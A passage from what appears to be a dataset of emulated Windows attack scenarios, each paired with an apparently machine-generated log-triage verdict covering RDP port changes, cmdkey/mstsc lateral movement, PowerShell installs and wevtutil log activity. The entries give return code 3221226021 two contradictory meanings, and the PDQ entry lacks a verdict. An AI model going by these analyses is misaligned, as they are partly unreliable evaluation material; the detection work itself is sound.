   - **Whoami.exe** is a legitimate tool for querying user privileges and other information, but atypical or repetitive use can indicate reconnaissance activities.
   - Repeated creation of **conhost.exe** processes without clear context could suggest attempts to spawn multiple console windows or interact with processes in a non-standard way.

**3. **Security Logs & Time Sync:**
   - Log entries indicate time synchronization adjustments with reference to `time.windows.com`. While time synchronization events are common and typically benign, they should be acknowledged as they can sometimes be manipulated for evasion purposes.
   - Changes in time settings without clear maintenance activities may introduce questions, especially in sensitive environments.

**4. **Service Activity:**
   - **MicrosoftEdgeUpdate.exe** activity is heavily logged. This service routinely checks for and installs updates for Microsoft Edge, typically benign, but provides a ready framework in some situations for abuse if service integrity is compromised.

### Overall Risk Assessment

- **PowerShell Command**: The usage of PowerShell with the `New-SmbMapping` along with `SkipCertificateCheck` is concerning and raises the potential for data exfiltration or lateral movement attempts within the network.
  
- **Frequent Process Initiations**: While common system utilities being run in isolation are benign, the pattern and frequency in the logs might suggest a build-up to further activities or an automated script executing a series of commands.

### Conclusion and Resolution

- **Resolution**: **SUSPICIOUS**
  - **Justification**: Although none of the activities provide a definitive confirmation of malicious actions, the PowerShell command with `SkipCertificateCheck`, multiple instances of command executions within a short time frame, and frequent creation of processes prompt the need for further investigation.
  
### Guidance and Next Steps

1. **Deep Dive into PowerShell Activity**: 
   - Verify the intention behind the creation of the SMB mapping using PowerShell and identify any file transfers to/from the mapped drive.
   - Investigate the entity initiating this command and ensure it aligns with legitimate business operations.

2. **Process Analysis**:
   - Examine the context around the frequent uses of system utilities like **whoami.exe** and **wevtutil.exe** for any unusual patterns.
   - Correlate any external IP-related activities to ensure it’s legitimate.

3. **Time Changes**:
   - Validate that time synchronization itself is not used as a tactic for covering tracks (but based on current evidence, it remains low-priority unless combined with other indicators).

4. **Service Integrity Check**:
   - Review the integrity of the Edge update mechanism unless concurrently running unusually high or failed update attempts with error logs.

5. **Initiate Threat Hunting Measures**:
   - Deploy hunt activities on this host for any persistence mechanisms or scheduled tasks that may have been planted.

Persistent vigilance and additional context will help either resolve suspicions or confirm the benign nature of these findings."

PDQ Deploy RAT,"**Detailed Analysis of Logs:**

1. **Service Control Manager Logs:**
   - An event (EventID 7045) shows the installation of the ""PDQ Deploy"" service. While this service is a legitimate application used for software deployment in enterprise environments, its setup as a disabled service and the use of the ""LocalSystem"" account could be suspicious if not managed and authorized by the IT department.

2. **Windows PowerShell Logs:**
   - A PowerShell script is executed to download and install the PDQ Deploy setup (`Deploy_19.3.350.0.exe`) from a defined URL using `Invoke-WebRequest`. The operation is executed with a silent install option (`/s`). This behavior is indicative of either an administrative automated deployment or a potential unauthorized installation.
   - Execution policies were set to Restricted, which is generally secure, but doesn't prevent execution of the script already defined and executed by the user context.

3. **Sysmon Logs:**
   - Frequent `wevtutil.exe` and `conhost.exe` activity is noted under the user `SERVER002\admin_test`. The `wevtutil` utility is used to export, archive, or clear event logs on the local machine and its appearance repeatedly without administrative intervention can suggest log tampering or reconnaissance.
   - Multiple entries related to PowerShell and CMD execution with arguments suggest potential automation or scripted tasks, particularly processes like `whoami.exe` and `hostname.exe`, which can be used to gather deployment information.

4. **Application Logs:**
   - An event (EventID 11707) indicates successful installation of the PDQ Deploy, corroborating with other log entries regarding its download and execution.

Deploy 7-Zip Using Chocolatey,"Upon reviewing the provided event logs from the Windows host, there are several entries that merit consideration for potential malicious activity or unusual behavior:

### Key Observations:

1. **Edge Update Processes**: The logs show numerous instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) being executed. These are accompanied by standard command line arguments like `/svc`, `/regsvc`, `/update`, and others. While frequent execution of update processes can be routine, some entries indicate execution from temporary directories (e.g., `C:\\Program Files (x86)\\Microsoft\\Temp\\EUD392.tmp\\MicrosoftEdgeUpdate.exe`), which is less common and could be suspicious if the files are not signed or verified.

2. **PowerShell Command Execution**:
   - There is an entry showing PowerShell being used to install 7-Zip via Chocolatey (`choco install -y 7zip`). This appears to be a legitimate software installation command. However, it is important to verify that the execution was intentional and performed by an authorized user, especially since PowerShell can be leveraged in attacks.
   - The logs indicate that the PowerShell session was initiated by `admin_test`, which suggests it was likely a user-initiated process.

3. **Wevtutil and Conhost Utility Execution**: 
   - Frequent executions of `wevtutil.exe` and `conhost.exe`. `Wevtutil.exe` is a legitimate command-line tool to retrieve information about event logs, while `conhost.exe` is a part of Windows Console Host. While their presence in logs is not inherently suspicious, frequent and unexplained executions could warrant further investigation if they coincide with suspicious activities.

4. **Execution by SYSTEM User and from SYSTEM Directory**:
   - The majority of these processes, especially those related to Edge Update, are executed by the `NT AUTHORITY\SYSTEM` user, running at high-integrity levels, which is typical for update-related operations, but still ideal for malware to execute under.

### Threat and Risk Assessment:

- **Suspicious Activity**: The Edge Update operations from a temporary directory raise suspicion, as attackers might create similarly named files in unconventional directories to piggyback on legitimate update processes or bypass certain security controls.
  
- **Malicious Indicators**: The current evidence isn't conclusive of a direct malware infection; however, the unusual directory usage and heavy reliance on SYSTEM-level operations suggest a requirement for further vigilance and validation against any authorized IT maintenance activities.

### Guidance:

1. **Validate Directory Usage**: Confirm if the usage of temporary directories for Edge updates is consistent with your IT department’s operations or policy. Investigate the file hashes against known good versions.

2. **Review User Activity**: Verify the legitimacy of PowerShell command executions and any corresponding user activity to ensure authorized use.

3. **Further Monitoring**: Increase endpoint monitoring to capture any subsequent unusual operations involving similar tools and processes.

4. **File Hash Verification**: Cross-reference executable hashes with threat intelligence databases to verify their integrity and authenticity.

5. **Endpoint Review**: Consider a thorough investigation of the concerned host to ensure no other signs of compromise or unauthorized changes.

### Final Resolution:

The situation is flagged as **SUSPICIOUS**. While many operations align with known update processes, the context of some events and directories used suggests a need for further examination to ensure they are benign and authorized."
Changing RDP Port to Non Standard Port via Command_Prompt,"After reviewing the provided Windows event logs, here's the detailed analysis:

### Analysis:

1. **Time Manipulation (Event ID 4616):**
   - The logs contain multiple instances of Event ID 4616, indicating the system time was changed. While this sometimes can occur due to legitimate operations, it can also be indicative of malicious attempts to evade detection through time-stomping. The changes are close in time and appear unusual.

2. **Privileged Account Activity (Event ID 4672):**
   - The admin_test account was granted a set of high-level privileges in a short time span, involving sensitive operations (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.). This kind of behavior can point towards potential account misuse or elevation of privileges possibly for malicious purposes.

3. **Suspicious CMD Execution with Network Configuration (Sysmon Event ID 1):**
   - A process has been executed running `cmd.exe /c reg add` which modifies the RDP port and allows a new firewall rule (PortNumber) to Port 4489. Such actions can indicate an attempt to hide unauthorized RDP connections by changing default port configurations or opening ports without authorization.

4. **Unauthorized Use of System Utilities (Sysmon Event ID 1):**
   - Several instances of usage of tools like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` by the admin_test account. The consistent pattern of using such utilities can be indicative of reconnaissance activity typically observed during a compromise where an attacker tries to gather system information.

5. **Failed Credential Validation (Event ID 5379):**
   - There have been multiple failed attempts involving credential operations with the return code `3221226021` (equivalent to `STATUS_ACCESS_DENIED`). This could indicate attempts at unauthorized access.

6. **Process Execution Under the Admin Context (Sysmon events):**
   - Sysmon logs show various processes like Microsoft Edge updater running under the `NT AUTHORITY\SYSTEM` identity and involving the admin_test user, which although might be legitimate update activities, in conjunction with other suspicious events, may contribute to suspected malicious behavior.

### Assessment:

The combination of time manipulation, high-privilege assignments, suspicious CMD executions, unauthorized use of system utilities, and failed credential operations collectively builds a case for potential malicious activity or attempted system compromise. 

### Guidance:

- **Immediate Action**: Engage in network isolation for Server002 and conduct a detailed forensic investigation. Pay special attention to any active network connections, and established RDP sessions, especially those targeting non-standard ports.
- **Account Auditing**: Conduct a review of the `admin_test` account activities to identify any unauthorized use or compromised credentials.
- **Log Review**: Expand the audit to include further logs (e.g., application or PowerShell logs) to check for script executions that might not have been captured here.

### Resolution: 

**MALICIOUS** - The logs suggest clear indicators of compromise, with unauthorized time changes, privilege escalations, and RDP modifications under suspicious account behaviors. This requires immediate response measures."
RDP to DomainController,"In analyzing the provided Windows event logs, several observations can be made:

### Security Logs:
- **Event ID 5379**: This indicates a failure event related to credential manager operations, showing consistent failure with a return code of `3221226021`. This code translates to ""Windows cannot find the specified resource"", indicating potential failed attempts to access credential information, possibly due to configuration issues or lack of necessary privileges. The target names reflect attempts to interact with various account credentials such as `MicrosoftAccount` and `WindowsLive`.
- **Event ID 4624**: Successful logon event using the `Advapi` process and `Negotiate` authentication package, typically used during service startups or scheduled tasks under the SYSTEM context.
- **Event ID 4672**: This event logs special privileges assigned to new logons. In this context, it's under the `SYSTEM` authority, which is standard.

### Sysmon Logs:
- Multiple instances of PowerShell executions, particularly from `admin_test` account, with command-line revealing credential manipulation using `cmdkey` and attempts to initiate RDP sessions (`mstsc`).
- Execution of `wevtutil.exe`, a legitimate utility for managing event logs, often seen in benign administrative tasks or log clearing actions.
- Use of `cmdkey.exe` to manage stored credentials and `mstsc.exe` to establish an RDP connection, raising suspicion as these could be utilized for lateral movement in a network breach scenario.

### System Logs:
- Routine updates related to Microsoft Defender Antivirus are logged, indicating system updates which are benign in context.

### Windows PowerShell Logs:
- Displays a PowerShell script leveraging environment variables to construct and execute commands for credential and RDP session management. Such scripts can indicate either legitimate automation or potentially malicious activity, depending on the context.

### Conclusion:
The logs indicate several systems and administrative actions typical in a corporate environment. However, the potential use of PowerShell for credential manipulation and attempts at establishing RDP connections using a script can be considered suspicious. The consistent credential-related errors (`3221226021`) paired with the observed use of `cmdkey` and attempts to automate RDP connections merit further investigation to ascertain the legitimacy of these operations.

Given these observations, the resolution for these logs is **SUSPICIOUS**. Additional investigation is needed to verify whether the activities and accounts involved are legitimate and authorized. It is advisable to:
- Review user activity logs for the `admin_test` account.
